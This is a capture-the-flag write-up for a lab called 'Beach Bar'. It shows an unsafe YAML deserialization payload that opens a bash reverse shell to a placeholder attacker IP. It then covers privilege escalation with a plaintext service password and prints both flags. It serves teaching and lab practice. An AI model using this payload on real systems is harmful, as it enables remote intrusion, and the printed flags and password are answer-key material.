# Title: Beach Bar

#### Category: Boot2Root

#### Difficulty: Easy

#### Description: 
At the Beach Bar even shell access is complimentary. The jukebox takes requests. Any kind. 

---

## Task 1: Hacker Holidays: Day 5

<img width="689" height="676" alt="image" src="https://github.com/user-attachments/assets/9c2e082d-0c03-45a1-9b08-883da7063ead" />

<img width="698" height="355" alt="image" src="https://github.com/user-attachments/assets/67f6a5ee-71e8-432b-a027-a2cc7d97274a" />


#### Analysis: 

This challenge is focused on gaining initial access through an insecure YAML deserialization vulnerability, followed by privilege escalation to retrieve both the user and root flags.

The website hints that the jukebox can import playlists, which immediately suggests that user-controlled files are being processed on the server. If the YAML parser is unsafe, we may be able to execute arbitrary commands and gain shell access.

---

### Methodology


#### Part 1: Access the Website and Gain a Shell

First, I accessed the challenge website.

<img width="1656" height="677" alt="image" src="https://github.com/user-attachments/assets/1bf25971-89d9-42b7-9703-367edae8517e" />

I viewed the page source and immediately found a staff note.

<img width="1090" height="850" alt="image" src="https://github.com/user-attachments/assets/a893bfa7-3eca-4ea7-9d07-e18b7abd07df" />

```
staff note: the demo DJ login is still enabled for the soft opening.
dj / dj -- swap this before the season starts (ticket BAR-7)

```
This tells me that the developers accidentally left the demo account enabled.


I logged in using the credentials:

```
Username: dj
Password: dj
```

<img width="1664" height="639" alt="image" src="https://github.com/user-attachments/assets/792d5fce-925a-475f-ab29-cf78950e4803" />

After logging in, I noticed that I could download and import playlists in YAML format.

Since the application imports YAML files, I decided to test for unsafe YAML deserialization by replacing the playlist contents with a reverse shell payload.

<img width="449" height="255" alt="image" src="https://github.com/user-attachments/assets/5bd21913-b52d-4a04-9fd8-eb52e0ee539e" />


```
playlist:
  name: !!python/object/apply:os.system {"bash -c 'bash -i >& /dev/tcp/ATTACK_BOX_IP/4444 0>&1'"}
  SONGS: []
```

If you're using OpenVPN, replace ATTACK_BOX_IP with your tun0 VPN addres

Why does this work?
> When the application unsafely loads this YAML file, it doesn't simply read the playlist—it executes the command inside the name field.
> The payload launches a Bash shell and connects back to my machine, giving me a reverse shell.


<img width="829" height="707" alt="image" src="https://github.com/user-attachments/assets/4b968667-7598-452e-ad26-67caccfc8788" />

Before importing the playlist, I started a Netcat listener.

```nc -lvnp 4444```

Then I uploaded the malicious playlist.
After importing it, my Netcat listener received a connection.

<img width="681" height="193" alt="image" src="https://github.com/user-attachments/assets/94d7edd8-ea03-490f-b8a6-d6b8c2ec2e54" />

I now had shell access to the target machine.

---

#### Part 2: Find the User Flag

Once inside the machine, I began exploring the filesystem.

> ls 

<img width="655" height="281" alt="image" src="https://github.com/user-attachments/assets/f6945d76-6008-4b82-9bfb-76eab60cf0b7" />

I continued moving through the directories.

> cd ..
> ls 

<img width="648" height="428" alt="image" src="https://github.com/user-attachments/assets/8b733e57-79a9-4e7a-ad7c-1ed888e2b5af" />

While exploring, I noticed the following directory:

/opt/beach-bar/jukeboxd

I'll come back to this later because it looks important for privilege escalation.

For now, I continued searching for the user flag.

Instead of manually checking every home directory, I used the following shortcut:

> cd ..

> ls 

<img width="424" height="118" alt="image" src="https://github.com/user-attachments/assets/6f8ed2e8-1ffb-4758-bfc0-781599fd8f8b" />

> cd ..

> ls 

<img width="354" height="588" alt="image" src="https://github.com/user-attachments/assets/7dc3f842-b459-44a8-900f-bae002ef7d8d" />

Instead of manually searching for a user.txt file, this command tries to print the contents of every user.txt file that matches the pattern.

> cat /*/*/user.txt

<img width="410" height="87" alt="image" src="https://github.com/user-attachments/assets/65853c3d-7ac7-41af-9a0c-b9d56bc39cf8" />

This command prints the contents of every user.txt located two directories below the root, making it a quick way to locate the user flag.

I successfully retrieved the user flag.

Manual Solution: 

<img width="459" height="275" alt="image" src="https://github.com/user-attachments/assets/fbde123a-3c0f-4845-a02e-bdd79329612a" />

If you want the exact location instead of using the shortcut:
> /home/bartender/user.txt

---

#### Part 3: Find the Root Flag

Now I returned to the directory I found earlier.

```
cd /opt/beach-bar/jukeboxd

```
<img width="491" height="69" alt="image" src="https://github.com/user-attachments/assets/88995047-0a7a-44b7-a065-77c81d774bca" />

I listed the files and opened the Python script.

> ls
> cat jukeboxd.py


<img width="734" height="577" alt="image" src="https://github.com/user-attachments/assets/4d6a0ed7-1bd4-48a8-87ed-d694b63ec799" />

The important section is:

```
parser.add_argument("--stream-pass", required=True, help="stream backend password")
parser.add_argument("--bitrate", default="320k")
```

Here I learned two things:

--bitrate controls the audio quality and is simply a configuration option.
--stream-pass is the password required to connect to the streaming backend.

Since --stream-pass is marked as required, the service cannot start without it. That means the password must be supplied somewhere, making it a good place to look for credentials.


The next step was to inspect the systemd service.

> systemctl show jukeboxd.service

<img width="748" height="668" alt="image" src="https://github.com/user-attachments/assets/27e52fa8-750e-44cf-a103-6f6eb3917b83" />

<img width="1682" height="102" alt="image" src="https://github.com/user-attachments/assets/0af43919-c756-43c4-bfda-42a121d5c1a1" />


Looking through the output, I found the service startup command, which included the password.
> SunsetSpritz2024!

Now I attempted to switch to the root user.
> su root 

I entered the recovered password. 
> SunsetSpritz2024!

After successfully authenticating, I navigated to the root directory.

```
ls 
jukeboxd.py
cd /root
cat root.txt
```

<img width="478" height="218" alt="image" src="https://github.com/user-attachments/assets/24ef12b8-04bc-491e-9cb8-9bb38943c4af" />

I successfully retrieved the root flag.

---

### Today's Itinerary 

1. Find the user flag
After gaining shell access through the vulnerable YAML import, I searched the filesystem and found the user flag in:
> /home/bartender/user.txt

2. Find the root flag
I analyzed the jukeboxd.py script and discovered that the service required a --stream-pass argument. By inspecting the systemd service configuration with systemctl show, I recovered the password, authenticated as root, and retrieved the root flag.

---

### Flag: 
User Flag:
> THM{y4ml_pl4yl1st_pwns_th3_b34ch}
Root Flag:
> THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}

This challenge demonstrates two common security issues that frequently appear in real-world environments. The first is unsafe YAML deserialization, where importing an untrusted YAML file allowed arbitrary system commands to be executed, resulting in a reverse shell. The second is credential exposure through service configuration. By reviewing the application source code, I identified that the service required a --stream-pass argument. Inspecting the systemd configuration revealed the password in plaintext, which allowed me to authenticate as the root user and complete the privilege escalation.

Overall, this challenge highlights the importance of securely parsing user-supplied data, avoiding hardcoded credentials in service configurations, and carefully reviewing application files during privilege escalation.
